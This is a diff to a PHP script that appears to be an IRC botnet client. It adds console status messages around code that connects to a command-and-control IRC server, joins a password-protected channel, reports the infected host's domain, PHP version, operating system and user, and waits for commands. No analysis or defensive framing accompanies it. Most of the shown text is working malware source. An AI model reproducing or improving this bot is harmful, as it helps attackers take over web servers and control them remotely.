@@ -205,9 +205,12 @@ function ircBot() {
     // Connect to IRC
     $socket = @fsockopen(IRC_SERVER, IRC_PORT, $errno, $errstr, 30);
     if (!$socket) {
+        echo "✗ Connection failed: $errstr ($errno)\n";
         @unlink($lock_file);
         exit(1);
     }
+    
+    echo "✓ Connected to IRC server\n";
     
     // Set socket options
     stream_set_timeout($socket, 300);
@@ -221,6 +224,11 @@ function ircBot() {
     // Join channel with key
     fputs($socket, "JOIN " . IRC_CHANNEL . " " . IRC_CHANNEL_KEY . "\r\n");
     sleep(1);
+    
+    echo "✓ Joined channel: " . IRC_CHANNEL . "\n";
+    echo "✓ Bot is now active and listening for commands\n";
+    echo "✓ Installation: " . ($installed_path ? $installed_path : "pending") . "\n\n";
+    flush();
     
     // Send bot info to channel
     $info_msg = "Bot connected: {$bot_info['domain']} | PHP {$bot_info['php_version']} | {$bot_info['os']} | User: {$bot_info['user']}";
@@ -330,5 +338,16 @@ function ircBot() {
 // ============================================
 // START BOT
 // ============================================
+// Print success message immediately
+echo "✓ IRC Bot Starting...\n";
+echo "  Server: " . IRC_SERVER . ":" . IRC_PORT . "\n";
+echo "  Channel: " . IRC_CHANNEL . "\n";
+echo "  Nick: " . getBotNick() . "\n";
+echo "  Installing and connecting...\n";
+flush();
+
 ircBot();
+
+// If we get here, bot disconnected
+echo "✗ Bot disconnected\n";
 ?>
